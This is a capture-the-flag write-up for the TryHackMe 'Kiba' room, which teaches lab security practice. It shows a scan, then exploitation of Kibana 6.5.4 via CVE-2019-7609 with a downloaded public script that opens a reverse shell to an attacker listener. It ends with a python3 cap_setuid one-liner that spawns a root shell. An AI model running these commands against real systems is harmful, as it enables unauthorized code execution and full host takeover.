# THM: Kiba

| Stat | Value |
| ---------- | -------------------------------------------- |
| Image | <img src="/images/write_ups/try_hack_me/kiba/kiba.png" alt="Kiba" width="90"/> |
| Room | Kiba |
| URL | https://tryhackme.com/room/kiba |
| Difficulty | Easy |

## Concepts/Tools Used

- getcap

## Room Description

Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution.

## Process

Once the machine starts up I save the machine's ip address to my host file so that I can type `target.thm` instead of an ip address.

I run nmap to see what ports are open:

```bash
$ nmap -T4 -n -sC -sV -Pn -p- target.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-05 22:05 BST
Nmap scan report for target.thm (10.10.223.67)
Host is up (0.045s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
|_  256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
80/tcp   open  http      Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
5601/tcp open  esmagent?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest: 
|     HTTP/1.1 503 Service Unavailable
|     retry-after: 30
|     content-type: text/html; charset=utf-8
|     cache-control: no-cache
|     content-length: 30
|     Date: Sat, 05 Jul 2025 21:05:55 GMT
|     Connection: close
|     Kibana server is not ready yet
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 503 Service Unavailable
|     retry-after: 30
|     content-type: text/html; charset=utf-8
|     cache-control: no-cache
|     content-length: 30
|     Date: Sat, 05 Jul 2025 21:05:54 GMT
|     Connection: close
|_    Kibana server is not ready yet
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5601-TCP:V=7.80%I=7%D=7/5%Time=686993B2%P=x86_64-pc-linux-gnu%r(Get
SF:Request,E0,"HTTP/1\.1\x20503\x20Service\x20Unavailable\r\nretry-after:\
SF:x2030\r\ncontent-type:\x20text/html;\x20charset=utf-8\r\ncache-control:
SF:\x20no-cache\r\ncontent-length:\x2030\r\nDate:\x20Sat,\x2005\x20Jul\x20
SF:2025\x2021:05:54\x20GMT\r\nConnection:\x20close\r\n\r\nKibana\x20server
SF:\x20is\x20not\x20ready\x20yet")%r(HTTPOptions,E0,"HTTP/1\.1\x20503\x20S
SF:ervice\x20Unavailable\r\nretry-after:\x2030\r\ncontent-type:\x20text/ht
SF:ml;\x20charset=utf-8\r\ncache-control:\x20no-cache\r\ncontent-length:\x
SF:2030\r\nDate:\x20Sat,\x2005\x20Jul\x202025\x2021:05:54\x20GMT\r\nConnec
SF:tion:\x20close\r\n\r\nKibana\x20server\x20is\x20not\x20ready\x20yet")%r
SF:(RTSPRequest,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(RPCChec
SF:k,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(DNSVersionBindReqT
SF:CP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(DNSStatusRequestT
SF:CP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Help,1C,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\n\r\n")%r(SSLSessionReq,1C,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\n\r\n")%r(TerminalServerCookie,1C,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\n\r\n")%r(TLSSessionReq,1C,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\n\r\n")%r(Kerberos,1C,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\
SF:r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Fou
SF:rOhFourRequest,E0,"HTTP/1\.1\x20503\x20Service\x20Unavailable\r\nretry-
SF:after:\x2030\r\ncontent-type:\x20text/html;\x20charset=utf-8\r\ncache-c
SF:ontrol:\x20no-cache\r\ncontent-length:\x2030\r\nDate:\x20Sat,\x2005\x20
SF:Jul\x202025\x2021:05:55\x20GMT\r\nConnection:\x20close\r\n\r\nKibana\x2
SF:0server\x20is\x20not\x20ready\x20yet")%r(LPDString,1C,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\n\r\n")%r(LDAPSearchReq,1C,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\n\r\n")%r(LDAPBindReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\n\r\n")%r(SIPOptions,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\
SF:r\n")%r(LANDesk-RC,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(T
SF:erminalServer,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
MAC Address: 02:C8:58:81:D8:AD (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.58 seconds
```

## What is the vulnerability that is specific to programming languages with prototype-based inheritance?

I type that question into google and it shows a result that talks about Prototype pollution.

I check the site running at http://target.thm. It mentions that linux capabilities are very interesting. I am not familiar with those but I do take a note of it. I don't see much else and so I check http://target.thm:5601 to see what is on that port before I try running directory enumeration on port 80.

## What is the version of visualization dashboard installed in the server?

The site on port 5601 has Kibana running. I click the link that says "explore my own" data. The first thing I do is try to find a version number for Kibana. I clicked the management link on the left side panel. It says version 6.5.4.

## What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

I run the following to command to see if searchsploit has anything:

```bash
$ searchsploit kibana 6.5.4
```

I get no results. I google "kibana 6.5.4 cve" and I find CVE-2019-7609 which is a arbitrary code execution for this version of Kibana.

I do another google search for "cve-2019-7609 poc". I get a hit with this one. I find a [github repository](https://github.com/LandGrey/CVE-2019-7609) with a python script. I download the script to my attack box with the following:

```bash
$ wget https://raw.githubusercontent.com/LandGrey/CVE-2019-7609/refs/heads/master/CVE-2019-7609-kibana-rce.py
```

## Compromise the machine and locate user.txt

The script wants a url to the kibana instance, it also wants the reverse shell url and port number. There is one more argument that will call the reverse shell but if that argument is not provided the script just verifies that the Kibana instance is vulnerable.

I make some changes to the script so that it will work with python3. They are the following:

- Line 23: Add `.decode('utf-8')` after r.content
- Line 57: Add `.decode('utf-8')` after r.content

After the changes, I check to make sure the Kibana instance is vulnerable with the following command:

```bash
$ python3 CVE-2019-7609-kibana-rce.py -u http://target.thm:5601
[+] http://target.thm:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
```

I open a new terminal on my attack box and run the following to start a reverse shell listener:

```bash
$ nc -lvnp 4444
```

Then I run the following:

```bash
$ python3 CVE-2019-7609-kibana-rce.py -u http://target.thm:5601 -host <attack_box_ip> -port 4444 --shell
[+] http://target.thm:5601 maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability
[+] reverse shell completely! please check session on: <attack_box_ip>:4444
```

I have a shell. I'm in!

I follow the [steps here](/README.md#stable-shell) to get a stable shell.

I run the following to see what users have a home directory:

```bash
$ ls -lh /home
kiba
```

I then cat the file in that directory:

```bash
$ cat /home/kiba/user.txt
REDACTED
```

## How would you recursively list all of these capabilities?

Since I am not familiar with linux capabilities, I did a google search and found the `getcap` command. I looked at the documentation for this command by running:

```bash
$ man getcap
```

As I read the documentation, I found that the -r flag does a recursive search. So the command is the following:

```bash
$ getcap -r / 2>/dev/null
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
```

I added the `2>/dev/null` because I only want successful values. The entry it returned is very interesting.

## Escalate privileges and obtain root.txt

All I had to do was create a shell as root using the python3 at the location above. Here is the command I ran:

```bash
$ /home/kiba/.hackmeplease/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

It worked. I'm in! The cursor changed to the # character to let me know that I am root. I ran the following to get the flag:

```bash
# cat /root/root.txt
REDACTED
```
